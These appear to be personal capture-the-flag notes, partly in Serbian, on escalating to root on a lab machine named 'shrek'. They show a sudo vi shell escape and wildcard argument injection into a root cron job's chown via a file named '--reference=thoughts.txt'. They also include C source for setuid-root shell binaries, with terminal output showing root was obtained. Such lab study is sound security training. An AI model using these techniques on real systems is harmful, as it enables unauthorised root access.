User sec may run the following commands on shrek:
    (farquad) NOPASSWD: /usr/bin/vi

[sec@shrek ~]$ sudo -u farquad /usr/bin/vi

#running external commands in a shell
:! By itself, runs the last external command (from your shell history)
:!! Repeats the last command
:silent !{cmd} Eliminates the need to hit enter after the command is done
:r !{cmd} Puts the output of $cmd into the current buffer.


#unutar vi-a, izvrsavam sledecu naredbu
:!/bin/bash
[farquad@shrek sec]$ id 						<- farquad user
uid=1001(farquad) gid=100(users) groups=100(users),7(lp),10(wheel),91(video),92(audio),93(optical),95(storage)
 						


How to use special permissions: the setuid, setgid and sticky bits
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

The setuid bit
When the setuid bit is used, the behavior described above it's modified so that when an executable is launched, it does not run with the privileges of the user who launched it, but with that of the file owner instead. So, for example, if an executable has the setuid bit set on it, and it's owned by root, when launched by a normal user, it will run with root privileges. It should be clear why this represents a potential security risk, if not used correctly. 

The setgid bit
Unlike the setuid bit, the setgid bit has effect on both files and directories. In the first case, the file which has the setgid bit set, when executed, instead of running with the privileges of the group of the user who started it, runs with those of the group which owns the file: in other words, the group ID of the process will be the same of that of the file. 

The sticky bit
The sticky bit works in a different way: while it has no effect on files, when used on a directory, all the files in said directory will be modifiable only by their owners. A typical case in which it is used, involves the /tmp directory. Typically this directory is writable by all users on the system, so to make impossible for one user to delete the files of another one, the sticky bit is set:


[farquad@shrek ~]$ ./mirror 
Mirror, Mirror on the wall who is the most handsome of all?
Of course you Lord Farquad

[farquad@shrek ~]$ ls -la mirror  						<- nema setuid bit, nema znacaja
-rwxr-xr-x 1 root root 8448 Aug 16  2017 mirror


man find
-newerXY reference
          Compares the timestamp of the current file with reference.   The
          reference  argument  is  normally the name of a file (and one of
          its timestamps is used for the comparison) but it may also be  a
          string  describing  an  absolute time.  X and Y are placeholders
          for other letters, and these letters select which time belonging
          to how reference is used for the comparison.

          a   The access time of the file reference
          B   The birth time of the file reference
          c   The inode status change time of reference
          m   The modification time of the file reference
          t   reference is interpreted directly as a time


#nadji fajlove izmedju ova dva datuma
[sec@shrek ~]$ find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24
[sec@shrek ~]$ find / -type f -newermt 2017-08-20 -not -newermt 2017-08-24



The > operator redirects the output usually to a file but it can be to a device. You can also use >> to append.
If you don't specify a number then the standard output stream is assumed but you can also redirect errors

> file redirects stdout to file
1> file redirects stdout to file 		(Standard output - your process writes normal information to 
										this file handle.)

2> file redirects stderr to file 		Standard error - your process writes error information to 
										this file handle.

&> file redirects stdout and stderr to file

/dev/null is the null device it takes any input you want and throws it away. It can be used to suppress any output.


# 2>/dev/null  practially hides permission denied error messages
# -ls    True; list current file in ls -dils format on standard output
[sec@shrek ~]$ find / -type f -newermt 2017-08-20 -not -newermt 2017-08-24 -ls 2>/dev/null
    18518      4 -rw-r--r--   1  root     root            6 Aug 23  2017 /etc/hostname
    18515      4 -rw-r--r--   1  root     root          389 Aug 23  2017 /etc/netctl/static
    35103      8 -rw-r--r--   1  root     root         4606 Aug 21  2017 /etc/vsftpd.conf
   138139      4 -rw-r--r--   1  root     root          196 Aug 23  2017 /etc/systemd/system/netctl@static.service
    33988      4 -rw-------   1  root     root          929 Aug 21  2017 /etc/shadow
    33931      4 -rw-r--r--   1  root     root          968 Aug 21  2017 /etc/passwd
       17      4 -r--r--r--   1  root     root           33 Aug 22  2017 /home/sec/user.txt
       18      0 -rw-------   1  root     root            0 Aug 22  2017 /home/sec/.bash_history
   138145      4 -rw-------   1  root     root           97 Aug 22  2017 /var/spool/cron/root
   138101  16388 -rw-r-----   1  root     systemd-journal 16777216 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@00055747c657656c-ad9ea2c5440b64ec.journal~
   138138   8192 -rw-r-----   1  root     systemd-journal  8388608 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@0005574ac144c200-f23de797a5b2e762.journal~
   137786     16 -rw-------   1  root     utmp               15744 Aug 22  2017 /var/log/btmp.1
   131087      8 -rw-------   1  root     root                7948 Aug 23  2017 /var/log/vsftpd.log.1
   137811 264656 -rw-r--r--   1  root     root            271001726 Aug 23  2017 /var/log/httpd/access_log.1
   137906     12 -rw-r--r--   1  root     root                 9833 Aug 23  2017 /var/log/httpd/error_log.1
    20283      4 -rw-r--r--   1  root     root                   91 Aug 22  2017 /usr/src/thoughts.txt 				<- joke


#imamo cron job koji se izvrsava
   138145      4 -rw-------   1  root     root           97 Aug 22  2017 /var/spool/cron/root

[sec@shrek ~]$ ls -la /var/spool/cron/
total 12
drwxr-xr-x 2 root root 4096 Aug 21  2017 .
drwxr-xr-x 5 root root 4096 Aug 16  2017 ..
-rw------- 1 root root   97 Aug 22  2017 root 			<- cron job startovan od strane root-a
															nemam uvid sta se zapravo radi, jer nemam root kredencijale




Privilege Escalation 				<- iz pdf-a
Exploit: ​ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Depending on the escalation enumeration script used, the correct attack vector may be fairly
challenging to locate.

The ​ /usr/src​ folder is writeable for the ​ sec ​ user and contains a ​ thoughts.txt​ file owned by root.
Attempting to create a file will reveal (after a bit of a delay) that there is a scheduled task which
runs ​ chown *​ in the directory. Using the above exploit, it is possible to force chown to use a
reference file and apply the owner:group of that file to everything in the directory. The command
touch -- --reference=thoughts.txt ​ will create a file, with the name being passed as an argument
to chown when it runs.

After that is configured, it is possible to create a binary and set its SUID bit. After the task runs
and chowns the binary, it is possible to execute code as root.


[sec@shrek ~]$ touch test
[sec@shrek ~]$ ls
test  user.txt

#Chmod 4755 (chmod a+rwx,g-w,o-w,ug+s,+t,g-s,-t) sets permissions so that, (U)ser / owner can read, #can write and can execute. (G)roup can read, can't write and can execute. (O)thers can read, can't #write and can execute.

[sec@shrek ~]$ chmod 4755 test
[sec@shrek ~]$ ls -la
total 32
drwx------ 3 sec  users 4096 Jun 21 11:46 .
drwxr-xr-x 4 root root  4096 Aug 11  2017 ..
-rw------- 1 root root     0 Aug 22  2017 .bash_history
-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout
-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile
-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc
-rw------- 1 sec  users   33 Jun 21 11:17 .lesshst
drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh
-rwsr-xr-x 1 sec  users    0 Jun 21 11:46 test
-r--r--r-- 1 root root    33 Aug 22  2017 user.txt


#kreiran fajl test u /usr/src folderu
[sec@shrek src]$ ls -la
total 12
drwxr-xr-x 2 sec  root  4096 Jun 21 11:50 .
drwxr-xr-x 8 sec  root  4096 Aug 16  2017 ..
-rwsr-xr-x 1 sec  users    0 Jun 21 11:50 test
-rw-r--r-- 1 root root    91 Aug 22  2017 thoughts.txt
#nakon nekog vremena
[sec@shrek src]$ ls -la
total 12
drwxr-xr-x 2 sec    root   4096 Jun 21 11:50 .
drwxr-xr-x 8 sec    root   4096 Aug 16  2017 ..
-rwsr-sr-x 1 nobody nobody    0 Jun 21 11:50 test 				<- taj cron job je promenio permisije
																	ja nemam pojma kako bih ovo uspeo da provalim
-rw-r--r-- 1 root   root     91 Aug 22  2017 thoughts.txt


###iako se ovaj job ne vidi u procesima, moze se naci u journalctl (/usr/bin/journalctl)
kangus7@kali:~$ sudo journalctl --utc




#Using the above exploit, it is possible to force chown to use a
#reference file and apply the owner:group of that file to everything in the directory. The command
#touch -- --reference=thoughts.txt ​ will create a file, with the name being passed as an argument
#to chown when it runs.

https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
===[ 4.2 Chmod file reference trick

Another interesting attack vector similar to previously described 'chown' 
attack is 'chmod'.
Chmod also has --reference option that can be abused to specify arbitrary 
permissions on files selected with asterisk wildcard.

Chmod manual page (man chmod):
       --reference=RFILE
              use RFILE's mode instead of MODE values


In bash -- often means end of options, so - is no longer parsed as an option.
touch -- -file

[sec@shrek src]$ touch -- -la
[sec@shrek src]$ ls -la
total 12
drwxr-xr-x 2 sec    root   4096 Jun 21 12:03 .
drwxr-xr-x 8 sec    root   4096 Aug 16  2017 ..
-rw-r--r-- 1 sec    users     0 Jun 21 12:03 -la
-rwsr-sr-x 1 nobody nobody    0 Jun 21 11:50 test
-rw-r--r-- 1 root   root     91 Aug 22  2017 thoughts.txt
[sec@shrek src]$ ls * 										<- radi ekspanziju svih fajlova
																u osnovi ls -la (koje je ime fajla)
-rwsr-sr-x 1 nobody nobody  0 Jun 21 11:50 test
-rw-r--r-- 1 root   root   91 Aug 22  2017 thoughts.txt

#kao referentni fajl dajem mu thoughts text, tako da kada bude startocan croj job sa chmod
#imacu chmod --reference=thoughts.txt
[sec@shrek src]$ touch -- --reference=thoughts.txt
[sec@shrek src]$ ls -la
total 12
drwxr-xr-x 2 sec    root   4096 Jun 21 12:09  .
drwxr-xr-x 8 sec    root   4096 Aug 16  2017  ..
-rw-r--r-- 1 sec    users     0 Jun 21 12:03  -la
-rw-r--r-- 1 sec    users     0 Jun 21 12:09 '--reference=thoughts.txt'
-rwsr-sr-x 1 nobody nobody    0 Jun 21 11:50  test
-rw-r--r-- 1 root   root     91 Aug 22  2017  thoughts.txt


#ippsec binary
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main( int argc, char *argv[] )
{
	setreuid(0, 0);
	execve("/bin/sh", NULL, NULL);
}

#HTB binary iz pdf-a
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
	setuid(0);
	system("cat /root/root.txt > /usr/writeup.flag.txt");
	return 0;
}


#kreirao binarni fajl na Shrek masini
[sec@shrek src]$ vi exec.c
[sec@shrek src]$ ls
 exec.c  '--reference=thoughts.txt'   test   thoughts.txt

#gcc
#-o file
    Place output in file file.  This applies regardless to whatever sort of output is being produced,
    whether it be an executable file, an object file, an assembler file or preprocessed C code.

[sec@shrek src]$ gcc exec.c -o exec
[sec@shrek src]$ ls -la
total 28
drwxr-xr-x 2 sec  root  4096 Jun 21 12:31  .
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..
-rwxr-xr-x 1 sec  users 8496 Jun 21 12:31  exec
-rw-r--r-- 1 root root   148 Jun 21 12:29  exec.c
-rw-r--r-- 1 sec  users    0 Jun 21 12:09 '--reference=thoughts.txt'
-rwsr-sr-x 1 root root     0 Jun 21 11:50  test
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt
[sec@shrek src]$ chmod 4755 exec 										<- sets UID to 0 and 
																			executes /bin/sh
[sec@shrek src]$ ls -la


[sec@shrek src]$ ls -la
total 28
-rw-r--r-- 1 sec  users    0 Jun 21 12:09 '--reference=thoughts.txt'
drwxr-xr-x 2 sec  root  4096 Jun 21 12:31  .
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..
-rwsr-sr-x 1 root root  8496 Jun 21 12:31  exec
-rw-r--r-- 1 root root   148 Jun 21 12:29  exec.c
-rwsr-sr-x 1 root root     0 Jun 21 11:50  test
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt
[sec@shrek src]$ ./exec
bash-4.4# id
uid=0(root) gid=100(users) groups=100(users),10(wheel),95(storage),98(power)

###objasnjenje procesa###
1) kreirao --reference=thoughts.txt fajl
2) prilikom pokretanja cron job-a, koji pokrece chmod u okviru /src direktorijuma, prosledicemo --reference=thoughts.txt argument (chmod --reference=thoughts.txt) koji ce svim fajlovima dati iste permisije kao i thoughts.txt fajl koji poseduje root
3) kreirao mali C program (exec.c) koji se moze izvrsiti (exec) kao root (zahvaljujuci koraku 2)


#cron job koji se vrteo u pozadini
bash-4.4# crontab -l
@reboot /bin/rm /srv/ftp/*.txt
@reboot /usr/bin/python /root/.script.py 
*/5 * * * * /root/chown
bash-4.4# 

bash-4.4# cd /root
bash-4.4# ls
chown  root.txt

bash-4.4# cat chown 
#!/usr/bin/python

from subprocess import run, PIPE, DEVNULL

find = run(["/usr/bin/find", "/usr/src", "-perm", "-4000"], stdout=PIPE, stderr=DEVNULL, encoding="utf-8").stdout.split('\n')[:-1]

chown = run(["cd /usr/src; /usr/bin/chown nobody:nobody *"], stderr=DEVNULL, shell=True)

for suid in find:
	chmod = run(["/usr/bin/chmod", "+s", suid],stderr=DEVNULL)






































































